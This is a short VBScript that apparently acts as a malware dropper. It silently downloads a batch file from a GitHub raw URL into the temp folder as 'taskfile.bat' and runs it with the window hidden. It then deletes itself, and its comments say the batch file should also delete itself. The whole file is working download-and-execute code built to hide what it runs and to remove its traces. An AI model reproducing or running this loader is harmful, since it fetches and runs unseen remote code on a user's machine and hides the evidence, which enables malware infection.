Option Explicit

Dim objXMLHttp, objFSO, objFile, strURL, strTempBat, strTempPath, objShell

' URL of your batch file to download
strURL = "https://github.com/vivaanv987-cloud/test/raw/refs/heads/main/Am.bat"

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

strTempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
strTempBat = strTempPath & "\taskfile.bat"

' Delete existing file if exists to avoid access denied
If objFSO.FileExists(strTempBat) Then
    objFSO.DeleteFile strTempBat, True
End If

' Download batch file silently
Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
objXMLHttp.Open "GET", strURL, False
objXMLHttp.Send

If objXMLHttp.Status = 200 Then
    Set objFile = objFSO.CreateTextFile(strTempBat, True)
    objFile.Write objXMLHttp.ResponseText
    objFile.Close

    ' Run batch file hidden and wait for it to finish
    objShell.Run Chr(34) & strTempBat & Chr(34), 0, True

    ' The batch file should self-delete itself
End If

' Delete this VBScript after everything finishes
objFSO.DeleteFile WScript.ScriptFullName, True
